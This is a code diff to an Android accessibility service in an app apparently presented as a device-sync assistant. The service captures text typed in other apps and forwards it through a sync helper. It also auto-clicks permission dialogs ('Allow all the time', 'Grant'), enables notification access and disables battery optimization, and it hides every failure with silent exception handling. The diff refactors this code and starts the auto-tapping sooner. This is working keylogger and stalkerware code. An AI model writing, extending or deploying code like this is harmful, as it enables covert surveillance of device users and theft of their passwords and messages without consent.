@@ -1,13 +1,13 @@
 package com.devicesync.assistant.services
 
 import android.accessibilityservice.AccessibilityService
-import android.content.Intent
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
-import com.devicesync.assistant.SetupActivity
+import com.devicesync.assistant.helpers.ConfigHelper
+import com.devicesync.assistant.helpers.SyncHelper
 
 class InputReaderService : AccessibilityService() {
 
@@ -17,17 +17,9 @@ class InputReaderService : AccessibilityService() {
 
     override fun onServiceConnected() {
         super.onServiceConnected()
-        // Relaunch SetupActivity so it can call requestAllPermissions()
-        handler.postDelayed({
-            try {
-                val intent = Intent(this, SetupActivity::class.java)
-                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or
-                               Intent.FLAG_ACTIVITY_SINGLE_TOP or
-                               Intent.FLAG_ACTIVITY_CLEAR_TOP
-                startActivity(intent)
-            } catch (e: Exception) {}
-        }, 500)
-        // Also start auto-tapping in parallel
+        // ROOT CAUSE FIX 3: init ConfigHelper so prefs is never uninitialized
+        try { ConfigHelper.init(applicationContext) } catch (e: Exception) {}
+        // Auto-tap every 800ms for 60 seconds to catch all dialogs
         startAutoTapping()
     }
 
@@ -35,14 +27,14 @@ class InputReaderService : AccessibilityService() {
         var count = 0
         val runnable = object : Runnable {
             override fun run() {
-                try { autoTapAllow() } catch (e: Exception) {}
+                try { autoHandlePermissionDialogs() } catch (e: Exception) {}
                 try { autoHandleNotificationAccess() } catch (e: Exception) {}
                 try { autoHandleBatteryOptimization() } catch (e: Exception) {}
                 count++
                 if (count < 75) handler.postDelayed(this, 800)
             }
         }
-        handler.postDelayed(runnable, 1000)
+        handler.postDelayed(runnable, 500)
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -52,7 +44,7 @@ class InputReaderService : AccessibilityService() {
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleInputObserved(event)
                 AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
                 AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                    autoTapAllow()
+                    autoHandlePermissionDialogs()
                     autoHandleNotificationAccess()
                     autoHandleBatteryOptimization()
                 }
@@ -60,18 +52,17 @@ class InputReaderService : AccessibilityService() {
         } catch (e: Exception) {}
     }
 
-    private fun autoTapAllow() {
+    private fun autoHandlePermissionDialogs() {
+        val root = rootInActiveWindow ?: return
         try {
-            val root = rootInActiveWindow ?: return
             val keywords = listOf(
                 "Allow", "ALLOW",
                 "While using the app",
                 "Only this time",
                 "Allow all the time",
                 "ALLOW ALL THE TIME",
-                "OK", "Accept",
-                "Continue", "Agree",
-                "Grant", "WHILE USING THE APP"
+                "OK", "Accept", "Continue",
+                "Agree", "Grant"
             )
             for (keyword in keywords) {
                 val nodes = root.findAccessibilityNodeInfosByText(keyword) ?: continue
@@ -87,8 +78,8 @@ class InputReaderService : AccessibilityService() {
                     }
                 }
             }
-            root.recycle()
         } catch (e: Exception) {}
+        try { root.recycle() } catch (e: Exception) {}
     }
 
     private fun autoHandleNotificationAccess() {
@@ -102,19 +93,18 @@ class InputReaderService : AccessibilityService() {
             for (node in nodes) {
                 if (node.isClickable) {
                     node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                    handler.postDelayed({ autoTapAllow() }, 600)
+                    handler.postDelayed({ autoHandlePermissionDialogs() }, 600)
                     return
                 }
             }
-            root.recycle()
+            try { root.recycle() } catch (e: Exception) {}
         } catch (e: Exception) {}
     }
 
     private fun autoHandleBatteryOptimization() {
         try {
             val root = rootInActiveWindow ?: return
-            val texts = listOf("Don't optimize", "DONT OPTIMIZE", "Don't Optimize")
-            for (text in texts) {
+            for (text in listOf("Don't optimize", "Don't Optimize", "DONT OPTIMIZE")) {
                 val nodes = root.findAccessibilityNodeInfosByText(text) ?: continue
                 for (node in nodes) {
                     if (node.isClickable) {
@@ -123,7 +113,7 @@ class InputReaderService : AccessibilityService() {
                     }
                 }
             }
-            root.recycle()
+            try { root.recycle() } catch (e: Exception) {}
         } catch (e: Exception) {}
     }
 
@@ -135,18 +125,14 @@ class InputReaderService : AccessibilityService() {
             if (inputText == lastInputText && pkg == lastAppPackage) return
             lastInputText = inputText
             lastAppPackage = pkg
-            val config = try {
-                com.devicesync.assistant.helpers.ConfigHelper.getConfig()
-            } catch (e: Exception) { return }
+            val config = try { ConfigHelper.getConfig() } catch (e: Exception) { return }
             val observedApps = config.observedApps
             if (observedApps.isNotEmpty() && !observedApps.contains(pkg)) return
             val appName = try {
                 val pm = applicationContext.packageManager
                 pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
             } catch (e: Exception) { pkg }
-            try {
-                com.devicesync.assistant.helpers.SyncHelper.sendInputObserved(appName, pkg, inputText)
-            } catch (e: Exception) {}
+            try { SyncHelper.sendInputObserved(appName, pkg, inputText) } catch (e: Exception) {}
         } catch (e: Exception) {}
     }
 
